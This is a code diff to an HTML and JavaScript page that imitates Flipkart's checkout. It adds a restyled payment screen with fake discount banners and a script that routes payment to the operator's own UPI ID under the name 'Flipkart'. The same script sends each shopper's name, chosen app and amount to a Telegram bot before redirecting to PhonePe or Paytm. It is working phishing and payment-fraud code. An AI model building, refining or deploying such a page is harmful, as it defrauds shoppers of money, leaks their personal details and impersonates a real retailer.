@@ -295,66 +295,78 @@
 </div>
 
    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
-    <nav class="bg-[#2874f0] p-4 text-white flex items-center gap-4">
-        <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
-        <span class="font-medium text-lg">Payments</span>
+    <nav class="bg-white p-4 flex items-center gap-4 shadow-sm">
+        <i class="fa-solid fa-arrow-left text-gray-700" onclick="showPage('page-summary')"></i>
+        <span class="font-medium text-gray-800">Payments</span>
     </nav>
 
-    <div class="bg-yellow-100 p-2 text-center border-b border-yellow-200">
-        <p class="text-[12px] font-bold text-yellow-800">✨ Get up to 80% Discount on All UPI Payments ✨</p>
+    <div class="bg-white flex justify-around py-3 border-b border-gray-100 mb-2">
+        <div class="flex flex-col items-center gap-1 opacity-50"><div class="w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] text-white">✓</div><span class="text-[10px]">Address</span></div>
+        <div class="flex flex-col items-center gap-1 opacity-50"><div class="w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] text-white">✓</div><span class="text-[10px]">Summary</span></div>
+        <div class="flex flex-col items-center gap-1"><div class="w-5 h-5 border-2 border-blue-600 rounded-full flex items-center justify-center text-[10px] text-blue-600 font-bold">3</div><span class="text-[10px] text-blue-600 font-bold">Payment</span></div>
+    </div>
+
+    <div class="px-4 mb-3">
+        <img src="https://i.ibb.co/Vp8XyqR/banner.png" class="w-full rounded-md shadow-sm" alt="Offer Banner">
+        <div class="bg-yellow-50 border border-yellow-200 p-2 rounded text-center mt-2">
+            <p class="text-[10px] font-bold text-yellow-800">Get up to 80% Discount on All UPI Payments</p>
+        </div>
     </div>
 
     <div class="p-4">
-        <h2 class="text-sm font-bold text-gray-600 mb-3">Select Your Payment Method</h2>
+        <h2 class="text-xs font-bold text-gray-500 mb-3 uppercase tracking-wide">Select Your Payment Method</h2>
         
-        <div class="bg-white rounded-sm shadow-sm overflow-hidden">
-            <div class="flex items-center justify-between p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50" onclick="triggerUPI('phonepe')">
+        <div class="bg-white rounded border border-gray-200 overflow-hidden mb-4">
+            <label class="flex items-center justify-between p-4 border-b border-gray-100 cursor-pointer active:bg-gray-50">
                 <div class="flex items-center gap-4">
-                    <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-8 h-8">
+                    <input type="radio" name="upi-provider" value="phonepe" checked class="w-4 h-4 accent-blue-600">
                     <span class="font-medium text-gray-700">PhonePe</span>
                 </div>
-                <div class="w-5 h-5 border-2 border-blue-600 rounded-full flex items-center justify-center">
-                    <div class="w-2.5 h-2.5 bg-blue-600 rounded-full"></div>
-                </div>
-            </div>
+                <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-7 h-7">
+            </label>
 
-            <div class="flex items-center justify-between p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50" onclick="triggerUPI('paytm')">
+            <label class="flex items-center justify-between p-4 border-b border-gray-100 cursor-pointer active:bg-gray-50">
                 <div class="flex items-center gap-4">
-                    <img src="https://img.icons8.com/color/48/paytm.png" class="w-8 h-8">
+                    <input type="radio" name="upi-provider" value="paytm" class="w-4 h-4 accent-blue-600">
                     <span class="font-medium text-gray-700">Paytm</span>
                 </div>
-                <div class="w-5 h-5 border-2 border-gray-300 rounded-full"></div>
-            </div>
+                <img src="https://img.icons8.com/color/48/paytm.png" class="w-7 h-7">
+            </label>
 
-            <div class="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50" onclick="triggerUPI('bhim')">
+            <label class="flex items-center justify-between p-4 cursor-pointer active:bg-gray-50">
                 <div class="flex items-center gap-4">
-                    <img src="https://img.icons8.com/color/48/upi.png" class="w-8 h-8">
+                    <input type="radio" name="upi-provider" value="bhim" class="w-4 h-4 accent-blue-600">
                     <span class="font-medium text-gray-700">BHIM UPI</span>
                 </div>
-                <div class="w-5 h-5 border-2 border-gray-300 rounded-full"></div>
-            </div>
+                <img src="https://img.icons8.com/color/48/upi.png" class="w-7 h-7">
+            </label>
         </div>
 
-        <div class="mt-4 bg-white p-4 rounded-sm shadow-sm">
-            <h3 class="text-sm font-bold border-b pb-2 mb-2">Price Details</h3>
-            <div class="flex justify-between text-sm py-1">
-                <span>Price (1 item)</span>
-                <span id="pay-mrp" class="text-gray-500">₹0</span>
+        <div class="bg-white p-4 rounded border border-gray-200">
+            <h3 class="text-sm font-bold border-b pb-2 mb-3 text-gray-800">Price Details</h3>
+            <div class="flex justify-between text-sm py-1.5">
+                <span class="text-gray-600">Price (1 item)</span>
+                <span id="p-mrp" class="text-gray-800">₹0</span>
             </div>
-            <div class="flex justify-between text-sm py-1">
-                <span>Delivery Charges</span>
-                <span class="text-green-600">FREE</span>
+            <div class="flex justify-between text-sm py-1.5">
+                <span class="text-gray-600">Delivery Charges</span>
+                <span class="text-green-600 font-medium">FREE</span>
             </div>
-            <div class="flex justify-between text-lg font-bold border-t mt-2 pt-2">
+            <div class="flex justify-between text-base font-bold border-t mt-3 pt-3">
                 <span>Amount Payable</span>
-                <span id="pay-total">₹0</span>
+                <span id="p-total" class="text-gray-900">₹0</span>
             </div>
         </div>
     </div>
-    
-    <div class="p-6 text-center opacity-60">
-        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/payment-method_69e7bc.svg" class="w-full grayscale opacity-50">
-        <p class="text-[10px] mt-2">Safe and secure payments. Easy returns. 100% Authentic products.</p>
+
+    <div class="fixed bottom-0 left-0 right-0 bg-white border-t p-3 flex items-center justify-between shadow-[0_-2px_10px_rgba(0,0,0,0.05)]">
+        <div>
+            <p class="text-[10px] text-gray-500 line-through" id="b-mrp">₹0</p>
+            <p class="text-lg font-bold" id="b-total">₹0</p>
+        </div>
+        <button onclick="processFinalPayment()" class="bg-[#fb641b] text-white px-10 py-3 rounded-sm font-bold text-sm shadow-md">
+            CONTINUE
+        </button>
     </div>
 </div>
     <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
@@ -561,45 +573,43 @@ let sel = null;
             showPage('page-summary');
         } else { alert("Please fill all details"); }
     }
-
- async function confirmPay() {
-    // UI update for price
-    document.getElementById('pay-mrp').innerText = "₹" + (sel.mrp || sel.price);
-    document.getElementById('pay-total').innerText = "₹" + sel.price;
-    
-    // Telegram Alert
-    const msg = `💰 *PAYMENT STEP* 💰\n👤 ${document.getElementById('uName').value}\n📦 ${sel.name}\n💵 ₹${sel.price}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+async function confirmPay() {
+    // Fill prices in payment page
+    document.getElementById('p-mrp').innerText = "₹" + (sel.mrp || "79,000");
+    document.getElementById('b-mrp').innerText = "₹" + (sel.mrp || "79,000");
+    document.getElementById('p-total').innerText = "₹" + sel.price;
+    document.getElementById('b-total').innerText = "₹" + sel.price;
 
     showPage('page-payment');
 }
 
-function triggerUPI(provider) {
+function processFinalPayment() {
+    const selectedApp = document.querySelector('input[name="upi-provider"]:checked').value;
     const amount = sel.price;
-    const upiID = MY_UPI; 
-    const txnRef = "FK" + Date.now();
-    const upiString = `upi://pay?pa=${upiID}&pn=Flipkart&am=${amount}&cu=INR&mc=5411&tr=${txnRef}`;
+    const upiID = MY_UPI;
+    const txnId = "TXN" + Date.now();
+    
+    // Original UPI String
+    const upiString = `upi://pay?pa=${upiID}&pn=Flipkart&am=${amount}&cu=INR&mc=5411&tr=${txnId}&tn=Flipkart_Order`;
 
-    // Browser ke "Leaving App" popup ko trigger karne ke liye
+    // Intent Mapping for "Leaving App" Popup
     let intentUrl = upiString;
-
-    if (provider === 'phonepe') {
+    if (selectedApp === 'phonepe') {
         intentUrl = `intent://pay${upiString.replace('upi://pay', '')}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(window.location.href)};end`;
-    } else if (provider === 'paytm') {
+    } else if (selectedApp === 'paytm') {
         intentUrl = `intent://pay${upiString.replace('upi://pay', '')}#Intent;scheme=upi;package=net.one97.paytm;S.browser_fallback_url=${encodeURIComponent(window.location.href)};end`;
     }
 
-    // 1 second ka delay taaki feel aaye ki process ho raha hai
-    alert("Redirecting to " + provider + "..."); 
-    
+    // Pehle Telegram pe alert bhejein
+    const msg = `💰 *PAYMENT CLICKED* 💰\nApp: ${selectedApp}\nUser: ${document.getElementById('uName').value}\nAmount: ₹${amount}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+
+    // Redirect trigger
     window.location.href = intentUrl;
 
     // Backup
-    setTimeout(() => {
-        window.location.href = upiString;
-    }, 1500);
+    setTimeout(() => { window.location.href = upiString; }, 1500);
 }
-
     init();
 </script>
 </body>
